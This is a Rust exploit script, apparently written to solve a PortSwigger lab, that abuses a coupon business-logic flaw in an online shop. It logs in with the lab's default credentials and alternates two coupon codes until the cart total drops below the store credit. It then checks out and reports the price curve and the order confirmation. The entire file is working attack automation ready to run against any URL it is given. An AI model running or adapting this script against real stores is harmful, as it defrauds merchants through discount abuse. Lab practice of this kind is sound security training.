#!/usr/bin/env rust-script
//! name: coupon_cycle
//! description: Alternating-coupon business-rule driver for shop targets - log in, put the target product in the cart, apply two coupon codes round-robin (targets that only block the same code twice in a row keep discounting), stop as soon as the cart total drops to the store credit or below, then check out and report the price curve, the accepted/rejected coupon sequence and the order confirmation.
//! version: 1.0.0
//! args: <base-url> --user U --password P --codes A,B [--product N] [--max-applies N] [--credit N] [--snippet N] [--selftest]
//! keywords: logic, flaw, business-rules, coupon, shop, ecommerce, portswigger, loop
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::time::Duration;

struct Client {
    agent: ureq::Agent,
    base: String,
    jar: BTreeMap<String, String>,
}

impl Client {
    fn new(base: String) -> Self {
        Client {
            agent: ureq::AgentBuilder::new().timeout(Duration::from_secs(30)).redirects(0).build(),
            base,
            jar: BTreeMap::new(),
        }
    }

    fn send(&mut self, method: &str, path: &str, form: Option<Vec<(&str, String)>>) -> Result<(u16, String, String), String> {
        let url = format!("{}{}", self.base, path);
        let body = form.map(|f| f.iter().map(|(k, v)| format!("{}={}", enc(k), enc(v))).collect::<Vec<_>>().join("&"));
        let mut last_err = String::new();
        for attempt in 0..4 {
            if attempt > 0 {
                std::thread::sleep(Duration::from_millis(400));
            }
            let cookie = self.jar.iter().map(|(k, v)| format!("{k}={v}")).collect::<Vec<_>>().join("; ");
            let mut req = self.agent.request(method, &url);
            if !cookie.is_empty() {
                req = req.set("Cookie", &cookie);
            }
            let result = match &body {
                Some(b) => req.set("Content-Type", "application/x-www-form-urlencoded").send_string(b),
                None => req.call(),
            };
            match result {
                Ok(r) => return Ok(self.finish(r)),
                Err(ureq::Error::Status(_, r)) => return Ok(self.finish(r)),
                Err(e) => last_err = format!("{e}"),
            }
        }
        Err(format!("{method} {path}: {last_err}"))
    }

    fn finish(&mut self, r: ureq::Response) -> (u16, String, String) {
        let status = r.status();
        let location = r.header("Location").unwrap_or("").to_string();
        for c in r.all("Set-Cookie") {
            if let Some((kv, _)) = c.split_once(';') {
                if let Some((k, v)) = kv.split_once('=') {
                    self.jar.insert(k.trim().to_string(), v.trim().to_string());
                }
            }
        }
        (status, location, r.into_string().unwrap_or_default())
    }
}

fn enc(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn csrf(html: &str) -> Option<String> {
    let needle = "name=\"csrf\" value=\"";
    let i = html.find(needle)? + needle.len();
    let rest = &html[i..];
    let j = rest.find('"')?;
    Some(rest[..j].to_string())
}

fn money_after(html: &str, needle: &str) -> Option<f64> {
    let i = html.find(needle)? + needle.len();
    let rest = &html[i..];
    let end = rest.find(|c: char| !(c.is_ascii_digit() || c == '.' || c == ',')).unwrap_or(rest.len());
    rest[..end].replace(',', "").parse().ok()
}

/// The cart total sits in the totals table as "<th>Total:</th><th>$X</th>".
fn cart_total(html: &str) -> Option<f64> {
    let i = html.find("<th>Total:</th>")?;
    money_after(&html[i..], "<th>$")
}

fn solved(html: &str) -> bool {
    html.contains("widgetcontainer-lab-status is-solved") || html.contains("Congratulations")
}

fn clip(s: &str, n: usize) -> String {
    let flat: String = s.split_whitespace().collect::<Vec<_>>().join(" ");
    flat.chars().take(n).collect()
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut base = String::new();
    let mut user = "wiener".to_string();
    let mut pass = "peter".to_string();
    let mut product: u32 = 1;
    let mut codes: Vec<String> = Vec::new();
    let mut max_applies: u32 = 200;
    let mut credit_cap = f64::MAX;
    let mut snippet = 160usize;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--user" => { i += 1; user = args[i].clone(); }
            "--password" => { i += 1; pass = args[i].clone(); }
            "--product" => { i += 1; product = args[i].parse().unwrap_or(product); }
            "--codes" => {
                i += 1;
                codes = args[i].split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
            }
            "--max-applies" => { i += 1; max_applies = args[i].parse().unwrap_or(max_applies); }
            "--credit" => { i += 1; credit_cap = args[i].parse().unwrap_or(credit_cap); }
            "--snippet" => { i += 1; snippet = args[i].parse().unwrap_or(snippet); }
            other if base.is_empty() && other.starts_with("http") => base = other.trim_end_matches('/').to_string(),
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        pi_rust_lib::report::failure("coupon_cycle", "usage: coupon_cycle <base-url> [--user U --password P --product N --codes A,B --max-applies N]", "pass the instance URL and two distinct --codes; coupon values are never defaulted");
        std::process::exit(2);
    }
    if codes.len() < 2 {
        pi_rust_lib::report::failure("coupon_cycle", "at least two coupon codes are required for the alternating attack", "pass --codes A,B with two distinct codes");
        std::process::exit(2);
    }

    match run(base, user, pass, product, codes, max_applies, credit_cap, snippet) {
        Ok(payload) => pi_rust_lib::report::success("coupon_cycle", payload, "check solved and final_total; if not solved the coupon codes need adjusting").unwrap_or(()),
        Err(e) => {
            pi_rust_lib::report::failure("coupon_cycle", &e, "check credentials, product id and coupon codes, then rerun");
            std::process::exit(1);
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn run(base: String, user: String, pass: String, product: u32, codes: Vec<String>, max_applies: u32, credit_cap: f64, snippet: usize) -> Result<Value, String> {
    let mut c = Client::new(base.clone());

    let (_, _, login_page) = c.send("GET", "/login", None)?;
    let tok = csrf(&login_page).ok_or("no csrf on /login")?;
    let (status, location, _) = c.send("POST", "/login", Some(vec![("csrf", tok), ("username", user.clone()), ("password", pass.clone())]))?;
    if status != 302 {
        return Err(format!("login failed with status {status}"));
    }
    let account_path = if location.is_empty() { format!("/my-account?id={user}") } else { location };
    let (_, _, account) = c.send("GET", &account_path, None)?;
    let credit = money_after(&account, "Store credit: $").ok_or("no store credit on the account page")?;

    // Make sure the target product is in the cart exactly once.
    let (_, _, cart) = c.send("GET", "/cart", None)?;
    let needle = format!("/product?productId={product}");
    let mut added = false;
    if !cart.contains(&needle) {
        c.send("POST", "/cart", Some(vec![("productId", product.to_string()), ("redir", "CART".to_string()), ("quantity", "1".to_string())]))?;
        added = true;
    }

    let limit = credit_cap.min(credit);
    let mut curve: Vec<Value> = Vec::new();
    let mut applied: Vec<String> = Vec::new();
    let mut rejected: Vec<Value> = Vec::new();
    let mut total = f64::MAX;
    let mut rounds = 0u32;

    while rounds < max_applies {
        let (_, _, cart) = c.send("GET", "/cart", None)?;
        let tok = csrf(&cart).ok_or("no csrf on /cart")?;
        total = cart_total(&cart).ok_or("no cart total on /cart")?;
        if total <= limit {
            break;
        }
        let code = codes[(rounds as usize) % codes.len()].clone();
        let (status, _, body) = c.send("POST", "/cart/coupon", Some(vec![("csrf", tok.clone()), ("coupon", code.clone())]))?;
        let ok = status == 302 || body.contains("Coupon applied");
        let (_, _, after) = c.send("GET", "/cart", None)?;
        let new_total = cart_total(&after).unwrap_or(total);
        if ok {
            applied.push(code.clone());
            curve.push(json!({"round": rounds + 1, "code": code, "status": status, "total": new_total, "delta": (total - new_total)}));
        } else {
            rejected.push(json!({"round": rounds + 1, "code": code, "status": status, "body": clip(&body, snippet)}));
        }
        total = new_total;
        rounds += 1;
    }

    let mut checkout = Value::Null;
    let mut final_status = 0u16;

    if total <= limit {
        let (_, _, cart) = c.send("GET", "/cart", None)?;
        let tok = csrf(&cart).ok_or("no csrf on /cart before checkout")?;
        let (status, location, body) = c.send("POST", "/cart/checkout", Some(vec![("csrf", tok)]))?;
        final_status = status;
        let follow = if location.is_empty() { "/cart/order-confirmation?order-confirmed=true".to_string() } else { location.clone() };
        let (_, _, confirm) = c.send("GET", &follow, None)?;
        let confirm_snippet = clip(&confirm.replace('<', " <"), snippet);
        let order_ok = confirm.contains("Order confirmed") || confirm.contains("order-confirmed") || confirm.contains("gift card");
        checkout = json!({
            "status": status,
            "location": location,
            "body": clip(&body, snippet),
            "confirmation_url": follow,
            "order_confirmed": order_ok,
            "confirmation_snippet": confirm_snippet,
        });
    }

    let (_, _, root) = c.send("GET", "/", None)?;
    let root_snippet = clip(&root.replace('<', " <"), 240);

    let payload = json!({
        "base": base,
        "user": user,
        "store_credit": credit,
        "spend_limit": limit,
        "product": product,
        "product_added_by_driver": added,
        "codes": codes,
        "applies": rounds,
        "applied_count": applied.len(),
        "rejected": rejected,
        "applied_sequence": applied,
        "curve_tail": curve.iter().rev().take(6).cloned().collect::<Vec<_>>(),
        "final_total": total,
        "checkout": checkout,
        "checkout_status": final_status,
        "solved": solved(&root),
        "root_snippet": root_snippet,
    });
    Ok(payload)
}
